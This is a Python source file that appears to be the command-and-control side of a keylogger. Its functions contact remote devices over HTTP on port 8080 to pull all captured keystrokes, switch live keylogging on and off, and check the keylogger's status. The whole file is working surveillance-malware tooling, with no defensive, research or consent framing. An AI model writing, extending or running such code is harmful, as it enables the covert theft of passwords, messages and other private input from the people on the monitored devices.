import requests
from logzero import logger
import time

PORT = 8080

def getAllKeystrokes(device_id, device_ip):
    try:
        url = f'http://{device_ip}:{PORT}/getAllKeyloggerData'
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data
        else:
            logger.error(f"Failed to get keystrokes for device {device_id}" + str(response.status_code))
            return None
    except requests.exceptions.ConnectTimeout as e:
        logger.error(f"Failed to get keystrokes due to connection timeout for device {device_id}")
        return None
    except Exception as e:
        logger.error(f"Failed to get keystrokes for device {device_id}" + str(e))
        return None

def enableLiveKeylogger(device_id, device_ip):
    try:
        url = f'http://{device_ip}:{PORT}/enableLiveKeylogger'
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data
        else:
            logger.error(f"Failed to enable live keylogger for device {device_id}" + str(response.status_code))
            return None
    except requests.exceptions.ConnectTimeout as e:
        logger.error(f"Failed to enable live keylogger due to connection timeout for device {device_id}")
        return None
    except Exception as e:
        logger.error(f"Failed to enable live keylogger for device {device_id}" + str(e))
        return None
    

def disableLiveKeylogger(device_id, device_ip):
    try:
        url = f'http://{device_ip}:{PORT}/disableLiveKeylogger'
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data
        else:
            logger.error(f"Failed to disable live keylogger for device {device_id}" + str(response.status_code))
            return None
    except requests.exceptions.ConnectTimeout as e:
        logger.error(f"Failed to disable live keylogger due to connection timeout for device {device_id}")
        return None
    except Exception as e:
        logger.error(f"Failed to disable live keylogger for device {device_id}" + str(e))
        return None

def getKeyloggerStatus(device_id, device_ip):
    try:
        url = f'http://{device_ip}:{PORT}/getKeyloggerStatus'
        logger.info(f"Requesting keylogger status from device {device_id} at {device_ip}")
        
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            logger.info(f"Got keylogger status response: {data}")
            return {
                "status": "success",
                "live_mode": data.get("live_mode", False),
                "device_id": device_id,
                "timestamp": int(time.time() * 1000)
            }
        else:
            logger.error(f"Failed to get keylogger status for device {device_id}: HTTP {response.status_code}")
            return {
                "status": "error",
                "message": f"Error getting keylogger status (HTTP {response.status_code})"
            }
    except requests.exceptions.ConnectTimeout as e:
        logger.error(f"Connection timeout getting keylogger status for device {device_id}")
        return {
            "status": "error",
            "message": "Connection timeout"
        }
    except Exception as e:
        logger.error(f"Failed to get keylogger status for device {device_id}: {str(e)}")
        return {
            "status": "error",
            "message": str(e)
        }